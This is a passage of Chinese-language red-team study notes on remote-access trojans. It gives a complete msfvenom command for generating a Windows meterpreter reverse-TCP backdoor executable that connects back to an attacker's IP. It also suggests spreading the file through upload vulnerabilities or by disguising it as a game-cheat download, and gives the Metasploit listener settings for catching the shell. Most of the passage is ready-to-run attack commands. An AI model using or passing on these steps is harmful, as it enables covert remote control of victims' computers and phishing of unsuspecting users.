...
```
远程控制木马被红队广泛使用，一般是由metasploit、cobaltstrike等C2控制器生成的系统可执行文件，如exe、elf、apk、macho文件。
...
1. ##### 使用 Metasploit 的 `msfvenom` 生成后门 EXE 文件。命令格式如下：

   ![image-20240816180809576](C:\Users\陈振庭\AppData\Roaming\Typora\typora-user-images\image-20240816180809576.png)

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<你的IP> lport=<你的端口> -f exe -o <文件名>.exe
-`LHOST`: 指定攻击者的 IP 地址 - `LPORT`: 指定攻击者的监听端口- `<文件名>.exe`: 输出的后门 EXE 文件名
```
...
```
一般通过两种方式传播：
		文件上传漏洞+命令执行（主动）	大学DVWA、pikachu
		文件下载钓鱼+诱导执行（钓鱼）	CF外挂网站外挂.exewindows病毒
```
...
##### 设置 payload 类型（与之前生成 EXE 文件时保持一致） set payload windows/x64/meterpreter/reverse_tcp
##### 设置攻击者的 IP 地址 set lhost <攻击者IP>
##### 设置监听端口 set lport <端口号>
```
